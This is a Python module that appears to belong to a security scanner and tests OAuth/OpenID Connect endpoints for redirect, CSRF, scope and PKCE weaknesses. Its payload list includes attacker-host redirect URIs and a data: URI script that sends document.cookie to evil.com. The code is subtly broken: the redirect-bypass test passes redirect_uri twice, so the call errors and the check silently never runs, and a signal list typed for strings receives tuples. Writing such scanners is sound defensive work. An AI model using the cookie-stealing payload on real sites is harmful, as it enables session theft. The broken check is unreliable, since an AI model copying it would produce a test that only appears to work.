"""OAuth / OpenID Connect validator.

Detects OAuth misconfigurations: redirect_uri validation bypass,
CSRF (state parameter missing), PKCE bypass, token leakage via
referrer, and scope elevation.
"""

from __future__ import annotations

import logging
import random
import string
import urllib.parse
from typing import Any, Callable

from src.core.scoring import ScoringConfig, bounded_confidence
from src.execution.validators.status import ValidationStatus

logger = logging.getLogger(__name__)

# Standard OAuth endpoints
OAUTH_ENDPOINTS: list[str] = [
    "/authorize",
    "/oauth/authorize",
    "/oauth2/authorize",
    "/connect/authorize",
    "/auth",
    "/oauth/auth",
    "/token",
    "/oauth/token",
    "/oauth2/token",
    "/connect/token",
    "/userinfo",
    "/oauth/userinfo",
    "/connect/userinfo",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]

# Redirect URI bypass payloads
REDIRECT_URI_BYPASS_PAYLOADS: list[str] = [
    "https://evil.com",
    "https://attacker.com/oauth_callback",
    "https://{target_host}.evil.com",
    "https://evil.com/{target_host}",
    "https://{target_host}@evil.com",
    "https://{target_host}.evil.com/authorize",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%2f{target_host}",
    "https://evil.com%40{target_host}",
    "data:text/html,<script>location.href='https://evil.com?'+document.cookie</script>",
]

# Scope manipulation payloads
SCOPE_ELEVATION_PAYLOADS: list[str] = [
    "openid profile email admin",
    "openid profile email *",
    "openid profile email admin:write",
    "openid profile email admin:*",
    "openid profile email admin.read admin.write",
    "openid profile email *:*",
    "openid profile email user:impersonate",
    "openid profile email system:*",
    "openid profile email all",
]


def _generate_state_token() -> str:
    """Generate a random state token for CSRF testing."""
    return "".join(random.choices(string.ascii_letters + string.digits, k=16))


def _build_authorize_url(
    base_url: str,
    redirect_uri: str,
    client_id: str = "test-client",
    scope: str = "openid profile email",
    state: str | None = None,
    response_type: str = "code",
) -> str:
    """Build an OAuth authorization URL with given parameters."""
    params = {
        "response_type": response_type,
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": scope,
        "state": state or _generate_state_token(),
    }
    separator = "&" if "?" in base_url else "?"
    return f"{base_url}{separator}{urllib.parse.urlencode(params)}"


def _check_state_parameter(response_body: str) -> bool:
    """Check if an OAuth callback lacks the state parameter."""
    lowered = response_body.lower()
    return "missing state" in lowered or "invalid state" in lowered or "state" not in lowered


def _check_pkce_bypass_possible(response_body: str) -> bool:
    """Check if the response suggests PKCE is not enforced."""
    lowered = response_body.lower()
    return "code_challenge" not in lowered and "code_verifier" not in lowered


def evaluate_oauth(
    *,
    authorize_endpoint: str | None = None,
    token_endpoint: str | None = None,
    userinfo_endpoint: str | None = None,
    scoring: ScoringConfig,
    http_request: Callable[[str, str, dict[str, str] | None], dict[str, Any]] | None = None,
    client_id: str = "test-client",
    redirect_uri: str = "https://client.example.com/callback",
    in_scope: bool = True,
) -> dict[str, Any]:
    """Evaluate an OAuth 2.0 / OIDC endpoint for security weaknesses.

    Args:
        authorize_endpoint: OAuth authorization endpoint URL.
        token_endpoint: OAuth token endpoint URL.
        userinfo_endpoint: OAuth userinfo endpoint URL.
        scoring: Scoring config.
        http_request: Callable for HTTP requests.
        client_id: OAuth client ID to use in tests.
        redirect_uri: Legitimate redirect URI for tests.
        in_scope: Whether the target is in scope.

    Returns:
        Dict with status/confidence/signals/evidence.
    """
    signals: list[str] = []
    bonuses: list[float] = []
    notes: list[str] = []
    responses: dict[str, Any] = {}

    if http_request is None:
        return {
            "status": ValidationStatus.INCONCLUSIVE.value,
            "confidence": 0.0,
            "signals": [],
            "evidence": {"reason": "no_http_request_callable"},
            "bonuses": [],
        }

    if in_scope:
        # Test redirect_uri validation bypass
        if authorize_endpoint:
            for payload in REDIRECT_URI_BYPASS_PAYLOADS[:3]:
                parsed = urllib.parse.urlparse(authorize_endpoint)
                crafted_redirect = payload.format(target_host=parsed.hostname or "localhost")
                auth_url = _build_authorize_url(
                    authorize_endpoint,
                    crafted_redirect,
                    client_id=client_id,
                    redirect_uri=redirect_uri,
                )
                try:
                    resp = http_request("GET", auth_url, None)
                    responses.setdefault("redirect_uri_tests", []).append({
                        "payload": payload,
                        "status_code": resp.get("status_code", 0),
                        "body_preview": str(resp.get("body", ""))[:150],
                    })
                    body = str(resp.get("body", "") or "")
                    location = str(resp.get("headers", {}).get("location", "") or "")
                    if "evil.com" in location or "attacker" in location:
                        signals.append(("redirect_uri_bypass", 0.18))
                        notes.append(
                            f"Redirect URI validation bypassed with: {payload}"
                        )
                        break
                except Exception as exc:
                    logger.debug("Redirect URI bypass test failed for payload '%s': %s", payload, exc)
                    continue

        # Test state parameter (CSRF) protection
        if authorize_endpoint:
            auth_url_no_state = _build_authorize_url(
                authorize_endpoint,
                redirect_uri,
                client_id=client_id,
                state=None,
            )
            try:
                resp = http_request("GET", auth_url_no_state, None)
                responses["state_test"] = {
                    "status_code": resp.get("status_code", 0),
                    "body_preview": str(resp.get("body", ""))[:150],
                }
                body = str(resp.get("body", "") or "")
                if "code=" in body or "code=" in str(resp.get("headers", {}).get("location", "")):
                    signals.append(("state_missing", 0.15))
                    notes.append("OAuth authorization request succeeded without state parameter - CSRF risk.")
            except Exception as exc:
                logger.debug("State parameter test failed: %s", exc)

        # Test scope elevation
        if authorize_endpoint:
            for elevated_scope in SCOPE_ELEVATION_PAYLOADS[:3]:
                auth_url_elevated = _build_authorize_url(
                    authorize_endpoint,
                    redirect_uri,
                    client_id=client_id,
                    scope=elevated_scope,
                )
                try:
                    resp = http_request("GET", auth_url_elevated, None)
                    responses.setdefault("scope_elevation_tests", []).append({
                        "scope": elevated_scope,
                        "status_code": resp.get("status_code", 0),
                        "body_preview": str(resp.get("body", ""))[:150],
                    })
                    body = str(resp.get("body", "") or "")
                    if "scope" in body.lower() and ("approved" in body.lower() or "granted" in body.lower()):
                        signals.append(("scope_elevation", 0.20))
                        notes.append(
                            f"Scope elevation possible: '{elevated_scope}' was accepted."
                        )
                        break
                except Exception as exc:
                    logger.debug("Scope elevation test failed for scope '%s': %s", elevated_scope, exc)
                    continue

        # Check PKCE enforcement at token endpoint
        if token_endpoint:
            try:
                resp = http_request(
                    "POST",
                    token_endpoint,
                    {
                        "grant_type": "authorization_code",
                        "code": "test_auth_code",
                        "redirect_uri": redirect_uri,
                        "client_id": client_id,
                    },
                )
                responses["pkce_test"] = {
                    "status_code": resp.get("status_code", 0),
                    "body_preview": str(resp.get("body", ""))[:150],
                }
                body = str(resp.get("body", "") or "")
                if _check_pkce_bypass_possible(body):
                    signals.append(("pkce_not_enforced", 0.12))
                    notes.append("PKCE (code_challenge) was not enforced at token endpoint.")
            except Exception as exc:
                logger.debug("PKCE enforcement test failed: %s", exc)

        # Check userinfo endpoint exposure
        if userinfo_endpoint:
            try:
                resp = http_request("GET", userinfo_endpoint, None)
                responses["userinfo_test"] = {
                    "status_code": resp.get("status_code", 0),
                    "body_preview": str(resp.get("body", ""))[:200],
                }
                body = str(resp.get("body", "") or "")
                if resp.get("status_code") == 200 and "sub" in body:
                    signals.append(("userinfo_unprotected", 0.10))
                    notes.append("Userinfo endpoint accessed without valid token.")
            except Exception as exc:
                logger.debug("Userinfo endpoint test failed: %s", exc)

    # Determine status
    if signals:
        high_risk = any(s[0] in ("redirect_uri_bypass", "scope_elevation", "state_missing") for s in signals)
        status = ValidationStatus.CONFIRMED.value if high_risk else ValidationStatus.HEURISTIC.value
    else:
        status = ValidationStatus.INCONCLUSIVE.value

    total_bonus = sum(s[1] for s in signals)
    signal_list = [s[0] for s in signals]

    confidence = bounded_confidence(
        base=scoring.base,
        cap=scoring.cap,
        bonuses=[total_bonus],
    )

    evidence = {
        "endpoints": {
            "authorize": authorize_endpoint,
            "token": token_endpoint,
            "userinfo": userinfo_endpoint,
        },
        "signals": signal_list,
        "notes": notes,
        "responses": responses,
    }

    return {
        "status": status,
        "confidence": confidence,
        "signals": signal_list,
        "evidence": evidence,
        "bonuses": [total_bonus],
    }
